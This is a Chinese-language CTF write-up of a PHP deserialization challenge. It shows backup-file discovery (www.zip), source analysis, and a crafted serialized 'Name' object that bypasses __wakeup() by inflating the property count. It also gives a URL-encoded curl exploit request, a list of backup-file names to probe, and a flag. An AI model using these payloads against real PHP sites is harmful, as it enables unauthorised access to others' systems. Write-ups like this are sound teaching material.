# [极客大挑战 2019]PHP

## 题目概述
页面提示"有备份网站的习惯"，需要找到备份文件，分析PHP代码，利用反序列化漏洞获取flag。

## 信息收集
1. 访问题目页面，发现提示文字："因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯"
2. 尝试常见备份文件名，发现 `www.zip` 可下载（HTTP 200）
3. 解压后得到关键文件：`index.php`、`flag.php`、`class.php`

## 漏洞分析
**漏洞类型**：PHP反序列化（`unserialize()`）+ `__wakeup()`绕过

**源码分析**：
- `index.php`：从GET参数`select`获取数据，直接调用`unserialize()`反序列化
- `class.php`：定义`Name`类，包含私有属性`$username`和`$password`
  - `__wakeup()`：反序列化时自动调用，将`username`设为`'guest'`
  - `__destruct()`：检查`password == 100`且`username === 'admin'`，满足则输出flag

**判断过程**：
- 需要构造`Name`对象，`username='admin'`，`password=100`
- `__wakeup()`会覆盖`username`为`'guest'`，需要绕过
- PHP反序列化漏洞：当序列化字符串中对象属性数量大于实际数量时，`__wakeup()`会被跳过

## 利用过程

**构造Payload**：
```python
# 原始序列化字符串
O:4:"Name":2:{s:14:"\x00Name\x00username";s:5:"admin";s:14:"\x00Name\x00password";s:3:"100";}

# 绕过__wakeup()：将属性数量从2改为3
O:4:"Name":3:{s:14:"\x00Name\x00username";s:5:"admin";s:14:"\x00Name\x00password";s:3:"100";}
```

**注意**：私有属性序列化时包含`\x00`（null字节），需要URL编码为`%00`

**发送请求**：
```bash
curl "http://target/?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D"
```

**Flag**：`flag{ae1d3e70-2b3f-4c73-9fc6-c8e3f343324c}`

## 复现步骤
1. 下载备份文件：`curl http://target/www.zip -o www.zip`
2. 解压查看源码：`unzip www.zip`
3. 分析`class.php`中的`Name`类逻辑
4. 构造序列化字符串，修改属性数量绕过`__wakeup()`
5. URL编码后通过GET参数`select`发送

## 技术总结
| 漏洞类型 | 攻击入口 | 核心Payload | 知识点 |
|---------|---------|------------|-------|
| PHP反序列化 | GET参数`select` | `O:4:"Name":3:{...}` | `unserialize()`执行对象的魔术方法 |
| `__wakeup()`绕过 | 序列化字符串 | 修改属性数量`2`→`3` | PHP Bug #72663，属性数量不匹配跳过`__wakeup()` |

## 知识总结
1. **备份文件探测**：题目提示有备份习惯时，尝试`www.zip`、`www.tar.gz`、`backup.zip`等
2. **`__wakeup()`绕过技巧**：将序列化字符串中`{`前的属性数量改为大于实际值
3. **私有属性编码**：PHP私有序列化格式为`\x00ClassName\x00propertyName`，传输时需URL编码`%00`
4. **PHP反序列化利用链**：关注`__construct`、`__wakeup`、`__destruct`、`__toString`等魔术方法
